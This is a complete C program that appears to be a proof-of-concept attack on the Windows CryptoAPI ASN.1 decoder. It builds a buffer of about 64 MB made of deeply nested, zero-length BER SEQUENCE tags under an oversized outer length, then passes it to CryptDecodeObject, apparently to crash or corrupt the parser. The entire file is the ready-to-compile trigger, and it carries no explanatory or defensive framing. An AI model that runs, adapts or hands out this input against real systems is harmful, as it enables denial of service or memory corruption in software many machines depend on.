#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <wincrypt.h>
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "ws2_32.lib")


typedef unsigned int u32;
typedef unsigned char u8;

int main() {
#define MAX_SIZE (0x4000000+0x30)
    unsigned char* buf = (char*)calloc(1, MAX_SIZE);

    HCERTSTORE hStore = NULL;
    PCCERT_CONTEXT pCert = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    DWORD pcbStructInfo[4];
    pcbStructInfo[0] = 0;
    // explicit tag
    int i = 0;
    int j;
    buf[i++] = 0x20|0x10;
    buf[i++] = 0x84;
    *(u32*)(buf + i) = ntohl(MAX_SIZE - 0x30 + 2);
    i += 4;
    for (j = 0; j < (MAX_SIZE-0x30+2) /2; j++) {
        // ASN1BERDecEoid
        buf[i++] = 0x20|0x10;
        buf[i++] = 0;
    }// "1.1." 4bytes, 

    CryptDecodeObject(1, (LPCSTR)0x23, (const BYTE*)buf, MAX_SIZE-0x10, 0, 0, pcbStructInfo);
    return 0;
}
